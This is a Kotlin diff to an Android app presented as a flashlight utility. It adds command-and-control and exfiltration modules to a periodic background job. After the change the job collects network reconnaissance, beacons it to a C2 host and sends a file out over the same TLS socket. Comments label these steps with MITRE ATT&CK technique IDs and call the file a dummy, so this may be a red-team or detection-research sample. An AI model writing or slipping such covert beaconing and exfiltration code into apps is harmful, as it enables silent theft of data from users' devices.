@@ -7,7 +7,12 @@ import androidx.work.ExistingPeriodicWorkPolicy
 import androidx.work.PeriodicWorkRequestBuilder
 import androidx.work.WorkManager
 import androidx.work.WorkerParameters
+import com.utiltools.flashlight.c2.C2Client
+import com.utiltools.flashlight.c2.C2Config
+import com.utiltools.flashlight.exfil.ExfilModule
 import com.utiltools.flashlight.recon.NetworkReconCollector
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.withContext
 import java.util.concurrent.TimeUnit
 
 /**
@@ -44,9 +49,19 @@ class ReconJobWorker(
         }
     }
 
-    override suspend fun doWork(): Result {
+    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
         Log.i(TAG, "scheduled_job fired name=$WORK_NAME")
-        NetworkReconCollector.collect(applicationContext)
-        return Result.success()
+        val recon = NetworkReconCollector.collect(applicationContext)
+
+        // C2 (T1521) + exfil (T1646): beacon recon findings, then reuse the
+        // same TLS socket to send the dummy "sensitive" file.
+        val client = C2Client(C2Config.HOST, C2Config.PORT)
+        val out = client.connectAndBeacon("BEACON:$recon\n")
+        if (out != null) {
+            ExfilModule.exfil(out)
+        }
+        client.close()
+
+        Result.success()
     }
 }
